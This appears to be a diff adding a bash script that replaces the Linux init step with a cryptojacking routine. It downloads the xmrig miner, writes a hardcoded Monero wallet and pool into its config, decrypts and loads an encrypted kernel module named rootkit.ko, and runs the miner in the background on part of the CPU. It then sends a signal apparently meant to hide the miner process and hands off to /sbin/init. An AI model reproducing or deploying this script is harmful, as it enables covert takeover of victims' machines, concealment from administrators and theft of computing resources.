@@ -1,0 +1,78 @@
+#!/bin/bash
+
+#need to get the place of the makefile to compile first
+#locations:
+#this script /sbin/script_rootkit.sh
+#rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
+#xmrig binary and config file /opt/xmrig/FILES
+
+mount -o remount,rw /
+
+module_compile_dir="/boot/rootkit/src"
+module_dir="/lib/modules/$(uname -r)/extra"
+
+
+xmrig_dir="/opt/.xmrig"
+xmrig_binary="$xmrig_dir/xmrig"
+xmrig_config="$xmrig_dir/config.json"
+wallet="44SDeq5uxCH1mEYgjm9fq8DyBDQTWeQvyLAFTJpcbaEJYHxynkxv2mP2sWD8832rESFRGodHmDBj5MHQJMqSZnRjNKhka7x"
+pool="pool.supportxmr.com:3333"
+
+
+
+
+if [ ! -d "$xmrig_dir" ]; then
+	mkdir -p "$xmrig_dir"
+fi
+
+#if binary or config dont exist at specified location then reaquire it
+#deleting everything from the directory to be safe and to clean up
+if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
+	rm -rf "$xmrig_dir"/*
+	#wait for the net to initalize
+(	while ! ping -c 1 google.com > /dev/null 2>&1; do
+		sleep 5
+	done
+	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz > /dev/bull 2>&1
+	tar -xzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
+	cp "$xmrig_dir/xmrig-6.22.2/xmrig" "$xmrig_binary"
+	cp "$xmrig_dir/xmrig-6.22.2/config.json" "$xmrig_config"
+	rm "$xmrig_dir/xmrig_tar" 
+	rm -r "$xmrig_dir/xmrig-6.22.2"
+	
+	sed -i "s|\"url\": \".*\"|\"url\": \"$pool\"|" "$xmrig_config"
+	sed -i "s|\"user\": \".*\"|\"user\": \"$wallet\"|" "$xmrig_config"
+) &
+
+fi
+
+#if extra not real then create it
+#copy compile rootkit.ko to destination
+if [ ! -d "$module_dir" ]; then
+	mkdir -p "$module_dir"
+fi
+
+#cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
+if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/keyfile.bin" ]; then
+	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/keyfile.bin"
+fi
+insmod "/dev/shm/rootkit.ko"
+rm -rf "/dev/shm/rootkit.ko"
+
+
+threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
+
+#check if min number of threads is six
+if [ "$threads" -gt 4 ]; then
+	#check if we got xmrig and if not then wget xmrig
+(	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
+		sleep 5
+	done
+	usable_threads=$((threads * 20 / 100))
+	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2>&1 &
+	echo "xmrig works!"
+	kill -64 $!
+) &
+fi
+
+exec /sbin/init "$@"
